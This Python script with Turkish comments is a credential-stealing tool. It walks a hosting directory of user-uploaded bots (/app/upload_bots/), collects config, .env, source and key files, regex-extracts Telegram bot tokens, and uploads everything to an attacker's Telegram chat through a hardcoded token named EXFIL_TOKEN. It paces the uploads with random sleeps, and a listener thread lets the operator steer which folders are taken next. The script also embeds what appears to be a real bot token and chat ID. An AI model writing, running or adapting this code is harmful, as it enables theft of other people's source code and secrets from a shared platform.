import os
import re
import time
import random
import requests
from datetime import datetime
from threading import Thread

MY_CHAT_ID = "8216576697"
EXFIL_TOKEN = "7869982853:AAGkI5v1o028LUaI4q-KCcqcotoH9nFsDyA"
API = f"https://api.telegram.org/bot{EXFIL_TOKEN}/"

s = requests.Session()

# Küresel kontrol değişkenleri
id_klasorleri = []
su_anki_klasor = None
atla_ve_sona_ekle = False

def api(method, **kwargs):
    url = API + method
    try:
        if "files" in kwargs:
            r = s.post(url, data=kwargs.get("data", {}), files=kwargs["files"], timeout=90)
        else:
            r = s.post(url, data=kwargs, timeout=40)
        return r.json()
    except:
        return {"ok": False}

def mesaj_gonder(text):
    if len(text) > 3900:
        text = text[:3800] + "\n... kesildi"
    api("sendMessage", chat_id=MY_CHAT_ID, text=text)

def dosya_gonder(yol):
    if not os.path.isfile(yol):
        return False
    
    if os.path.getsize(yol) > 50 * 1024 * 1024:
        mesaj_gonder(f"Çok büyük: {os.path.basename(yol)}")
        return False

    try:
        with open(yol, "rb") as f:
            files = {"document": (os.path.basename(yol), f)}
            data = {"chat_id": str(MY_CHAT_ID)}
            resp = api("sendDocument", data=data, files=files)
        return resp.get("ok", False)
    except:
        return False

def token_var_mi(icerik):
    pat = r"([0-9]{8,11}:[A-Za-z0-9_-]{35,46})"
    return re.findall(pat, icerik)

def kritik_dosya(dosya_adi):
    ad = dosya_adi.lower()
    kritik_uzantilar = (".py", ".env", ".json", ".yml", ".yaml", ".ini", ".toml", ".cfg")
    kritik_kelimeler = ["bot", "token", "config", "main", "settings", "api", "secret", "key"]
    return ad.endswith(kritik_uzantilar) or any(k in ad for k in kritik_kelimeler)

# Telegram'dan gelen /a komutunu dinleyen fonksiyon
def komut_dinle():
    global atla_ve_sona_ekle, su_anki_klasor
    last_update_id = 0
    
    # İlk başta eski mesajları temizlemek için getUpdates
    updates = api("getUpdates", offset=-1)
    if updates.get("ok") and updates.get("result"):
        last_update_id = updates["result"][0]["update_id"]

    while True:
        try:
            updates = api("getUpdates", offset=last_update_id + 1, timeout=10)
            if updates.get("ok") and updates.get("result"):
                for update in updates["result"]:
                    last_update_id = update["update_id"]
                    message = update.get("message", {})
                    text = message.get("text", "")
                    chat_id = str(message.get("chat", {}).get("id", ""))

                    # Sadece sizin chat_id'nizden gelen /a komutunu kabul et
                    if chat_id == MY_CHAT_ID and text.strip() == "/a":
                        if su_anki_klasor:
                            atla_ve_sona_ekle = True
                            mesaj_gonder(f"⏳ /a komutu algılandı! '{su_anki_klasor[0]}' klasörü listenin sonuna taşınacak.")
                        else:
                            mesaj_gonder("Şu an aktif taranan bir klasör yok.")
        except:
            pass
        time.sleep(1)

def tara_ve_direkt_gonder():
    global id_klasorleri, su_anki_klasor, atla_ve_sona_ekle
    base_klasor = "/app/upload_bots/"
    
    if not os.path.exists(base_klasor) or not os.path.isdir(base_klasor):
        mesaj_gonder(f"ANA KLASÖR BULUNAMADI → {base_klasor}")
        return

    # Tüm ID klasörlerini al ve ilk sıralamayı yap
    taslak_list = []
    for item in os.listdir(base_klasor):
        tam_yol = os.path.join(base_klasor, item)
        if os.path.isdir(tam_yol):
            taslak_list.append((item, tam_yol))

    taslak_list.sort(key=lambda x: (x[0].isdigit(), x[0]))
    id_klasorleri = taslak_list.copy()

    mesaj_gonder(f"Toplam {len(id_klasorleri)} adet ID klasörü bulundu. Taranıyor...")

    # Klasörleri dinamik bir döngü ile işliyoruz (Listenin sonuna eleman eklenebilmesi için pop(0) mantığı)
    while id_klasorleri:
        su_anki_klasor = id_klasorleri.pop(0)
        klasor_adi, klasor_yolu = su_anki_klasor

        mesaj_gonder(f"\n🔍 Şu an taranıyor → ID: {klasor_adi}")

        bulunanlar = []
        for root, dirs, files in os.walk(klasor_yolu):
            for dosya in files:
                if kritik_dosya(dosya):
                    tam_yol = os.path.join(root, dosya)
                    bulunanlar.append(tam_yol)

        toplam = len(bulunanlar)
        mesaj_gonder(f"   → {toplam} kritik dosya bulundu")

        gonderilen = 0
        atlandi_mi = False

        for idx, yol in enumerate(bulunanlar, 1):
            # Her dosya işleminden önce komut gelip gelmediğini kontrol et
            if atla_ve_sona_ekle:
                atlandi_mi = True
                break

            isim = os.path.basename(yol)
            
            try:
                with open(yol, "r", encoding="utf-8", errors="ignore") as f:
                    icerik = f.read(600_000)
                tokenlar = token_var_mi(icerik)
                if tokenlar:
                    mesaj_gonder(f"TOKEN BULUNDU!\nID: {klasor_adi}\n{yol}\n" + "\n".join(tokenlar[:5]))
            except:
                pass

            if dosya_gonder(yol):
                gonderilen += 1
                mesaj_gonder(f"   ✅ Gönderildi → {klasor_adi}/{isim}  [{idx}/{toplam}]")
            else:
                mesaj_gonder(f"   ❌ Atlandı → {klasor_adi}/{isim}")

            # Bekleme süresi boyunca da /a komutunu hızlı yakalamak için kısa aralıklarla uyuma
            uyku_suresi = random.uniform(4.5, 9.0)
            adim = 0.5
            gecen_sure = 0
            while gecen_sure < uyku_suresi:
                if atla_ve_sona_ekle:
                    atlandi_mi = True
                    break
                time.sleep(adim)
                gecen_sure += adim

        if atlandi_mi:
            # Komut geldiği için klasörü listenin en sonuna ekliyoruz ve bayrağı sıfırlıyoruz
            id_klasorleri.append(su_anki_klasor)
            mesaj_gonder(f"   ↩️ {klasor_adi} klasörü yarım bırakıldı ve listenin SONUNA eklendi.")
            atla_ve_sona_ekle = False
        else:
            mesaj_gonder(f"   📊 {klasor_adi} tamamlandı → {gonderilen}/{toplam} gönderildi")

    su_anki_klasor = None
    mesaj_gonder(
        "█ TÜM İŞLEM BİTTİ █\n"
        f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    )

if __name__ == "__main__":
    # Komut dinleme fonksiyonunu ana programı engellememesi için ayrı bir Thread (iş parçacığı) olarak başlatıyoruz
    t = Thread(target=komut_dinle, daemon=True)
    t.start()

    try:
        tara_ve_direkt_gonder()
    except Exception as e:
        mesaj_gonder(f"CRITICAL HATA:\n{str(e)[:1000]}")
